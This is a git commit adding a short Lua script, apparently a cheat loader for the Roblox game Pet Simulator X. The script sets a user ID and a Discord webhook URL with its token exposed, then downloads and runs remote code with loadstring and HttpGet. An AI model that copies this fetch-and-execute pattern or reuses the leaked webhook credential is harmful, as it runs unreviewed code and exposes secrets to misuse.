d5dd86f84baf9ca1a1ebff8a1a3aae1a5b828d7b
Josh123x <120298843+Josh123x@users.noreply.github.com>
2022-12-11 15:20:34 +0800

    Create HasteFarm.lua

---
+++ vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua
@@ -0,0 +1,3 @@
+_G.UserID = 936316911
+_G.WebHook = "https://discord.com/api/webhooks/1051365732719530034/6re84-h1ZqLhbuvujExH_rs_JlFxAyOEgFNpNnZ2zl5PdNyAFr1vEDTvCCYJhXVX4X1t"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
